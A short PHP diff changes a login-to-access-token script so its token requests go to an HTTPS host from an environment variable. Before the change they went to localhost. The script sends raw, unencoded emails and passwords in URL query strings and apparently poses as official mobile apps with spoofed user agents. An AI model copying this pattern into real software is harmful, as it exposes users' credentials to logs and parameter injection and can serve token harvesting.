@@ -8,18 +8,18 @@ if (isset($_POST["email"]) && isset($_POST["password"]) && isset($_POST["app_id"
     {
         $useragent = array_rand($user_agent['android']);
         $app = 'android';
-        $token = json_decode(file_get_contents('http://'.'localhost'.'/android.php?u='.$email.'&p='.$pass.'&user_agent='.$useragent.''),true);
+        $token = json_decode(file_get_contents('https://'.getenv('DOMAIN_NAME').'/android.php?u='.$email.'&p='.$pass.'&user_agent='.$useragent.''),true);
     }else if($app_id == 165907476854626)
     {
         $useragent = array_rand($user_agent['iphone']);
         $app = 'iphone';
-        $token = json_decode(file_get_contents('http://'.'localhost'.'/ios.php?u='.$email.'&p='.$pass.'&user_agent='.$useragent.''),true);
+        $token = json_decode(file_get_contents('https://'.getenv('DOMAIN_NAME').'/ios.php?u='.$email.'&p='.$pass.'&user_agent='.$useragent.''),true);
 
     }else if($app_id == 6628568379)
     {
         $useragent = array_rand($user_agent['iphone']);
         $app = 'iphone';
-        $token = json_decode(file_get_contents('http://'.'localhost'.'/iphone.php?u='.$email.'&p='.$pass.'&user_agent='.$useragent.''),true);
+        $token = json_decode(file_get_contents('https://'.getenv('DOMAIN_NAME').'/iphone.php?u='.$email.'&p='.$pass.'&user_agent='.$useragent.''),true);
     }
     if(isset($token['access_token'])) {
         $token_validating = validate_token($app,$token['access_token'],$useragent);
